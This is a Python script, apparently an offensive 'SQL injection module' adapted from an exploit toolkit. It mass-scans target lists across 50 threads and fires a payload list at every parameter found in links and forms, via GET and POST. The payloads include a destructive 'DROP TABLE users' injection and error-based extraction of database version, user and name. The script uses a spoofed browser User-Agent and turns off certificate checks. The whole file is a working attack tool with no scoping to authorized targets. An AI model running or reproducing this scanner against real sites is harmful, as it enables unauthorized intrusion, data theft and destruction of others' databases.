#!/usr/bin/env python3
"""
SQL INJECTION MODULE v1.0
==========================
SQL injection scanner dan extractor
Diadaptasi dari AlienExploit Tool8
"""

import requests
import re
import threading
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
}

# SQL injection payloads
SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1",
    "' OR 1=1 --",
    "' OR 1=1 /*",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "1 AND 1=1",
    "1 AND 1=2",
    "' OR 'x'='x",
    "' OR 'x'='y",
    "') OR ('1'='1",
    "') OR ('1'='1' --",
    "'; DROP TABLE users; --",
    "'; SELECT * FROM users; --",
    "' OR 1=1 LIMIT 1--",
    "' OR 1=1 LIMIT 1 OFFSET 1--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user())))--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--",
    "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version())))--",
    "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())))--",
    "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())))--",
]

# Error signatures
SQLI_ERRORS = [
    'you have an error in your sql syntax',
    'warning: mysql',
    'unclosed quotation mark',
    'quoted string not properly terminated',
    'microsoft ole db provider for sql server',
    'odbc sql server driver',
    'sqlserver jdbc driver',
    'postgresql query failed',
    'supplied argument is not a valid mysql',
    'pg_query() [<a href=\'function.pg-query\'>',
    'sqlite3::query',
    'sqlite error',
    'ora-01756',
    'ora-00933',
    'ora-00936',
    'mysql_fetch_array()',
    'mysql_fetch_assoc()',
    'mysql_num_rows()',
    'mysql_query()',
    'mysqli_query()',
    'mysqli_fetch_array()',
    'pg_fetch_array()',
    'pg_query()',
    'sqlsrv_query()',
    'sqlsrv_fetch_array()',
]


class SQLIInjector:
    """SQL injection scanner dan extractor."""
    
    def __init__(self):
        self.vulnerable = []
        self.lock = threading.Lock()
    
    def scan(self, target):
        """Scan single target untuk SQL injection vulnerabilities."""
        target = target.strip().rstrip('/')
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        # Find parameters
        params = self._find_params(target)
        if not params:
            return None
        
        for param in params:
            for payload in SQLI_PAYLOADS:
                try:
                    # Test GET
                    r = requests.get(f'{target}?{param}={payload}', timeout=10, headers=HEADERS, verify=False)
                    for error in SQLI_ERRORS:
                        if error in r.text.lower():
                            console.print(f"  [green]✓ SQLI FOUND: {target} | Param: {param} | Payload: {payload}[/green]")
                            with self.lock:
                                self.vulnerable.append({
                                    'target': target,
                                    'param': param,
                                    'payload': payload,
                                    'error': error,
                                    'type': 'GET'
                                })
                            return {
                                'target': target,
                                'param': param,
                                'payload': payload,
                                'error': error,
                                'type': 'GET'
                            }
                except:
                    pass
                
                try:
                    # Test POST
                    r = requests.post(target, data={param: payload}, timeout=10, headers=HEADERS, verify=False)
                    for error in SQLI_ERRORS:
                        if error in r.text.lower():
                            console.print(f"  [green]✓ SQLI FOUND: {target} | Param: {param} | Payload: {payload}[/green]")
                            with self.lock:
                                self.vulnerable.append({
                                    'target': target,
                                    'param': param,
                                    'payload': payload,
                                    'error': error,
                                    'type': 'POST'
                                })
                            return {
                                'target': target,
                                'param': param,
                                'payload': payload,
                                'error': error,
                                'type': 'POST'
                            }
                except:
                    pass
        
        return None
    
    def _find_params(self, target):
        """Find URL parameters dari target."""
        params = []
        try:
            r = requests.get(target, timeout=10, headers=HEADERS, verify=False)
            # Find links dengan parameters
            links = re.findall(r'href=["\'](.*?\?.*?)["\']', r.text)
            for link in links:
                if '?' in link:
                    query = link.split('?')[1]
                    for pair in query.split('&'):
                        if '=' in pair:
                            param = pair.split('=')[0]
                            if param not in params:
                                params.append(param)
            
            # Find forms
            forms = re.findall(r'<form.*?</form>', r.text, re.DOTALL)
            for form in forms:
                inputs = re.findall(r'name=["\'](.*?)["\']', form)
                for inp in inputs:
                    if inp not in params:
                        params.append(inp)
        except:
            pass
        
        return params
    
    def scan_mass(self, targets, threads=50):
        """Scan multiple targets untuk SQL injection."""
        console.print(f"\n[bold cyan]MASS SQL INJECTION SCAN[/bold cyan]")
        console.print(f"  Targets: {len(targets)}")
        console.print(f"  Threads: {threads}")
        
        results = []
        
        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Scanning for SQLi...", total=len(targets))
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(self.scan, t): t for t in targets}
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    try:
                        result = future.result()
                        if result:
                            results.append(result)
                    except:
                        pass
        
        # Summary
        console.print(f"\n[bold green]SQLI SCAN COMPLETE[/bold green]")
        console.print(f"  Vulnerable: {len(results)}")
        
        if results:
            table = Table(title="SQL Injection Vulnerabilities")
            table.add_column("Target", width=40)
            table.add_column("Param", width=15)
            table.add_column("Type", width=8)
            table.add_column("Payload", width=30)
            for r in results:
                table.add_row(r['target'], r['param'], r['type'], r['payload'][:30])
            console.print(table)
        
        return results


def main():
    import argparse
    parser = argparse.ArgumentParser(description="SQL Injection Scanner")
    parser.add_argument("-l", "--list", help="Target list file")
    parser.add_argument("-t", "--target", help="Single target")
    parser.add_argument("--threads", type=int, default=50)
    args = parser.parse_args()
    
    targets = []
    if args.list:
        with open(args.list) as f:
            targets = [l.strip() for l in f if l.strip()]
    elif args.target:
        targets = [args.target]
    else:
        console.print("[red]Error: Specify -l list.txt or -t target[/red]")
        return
    
    injector = SQLIInjector()
    injector.scan_mass(targets, args.threads)


if __name__ == "__main__":
    main()
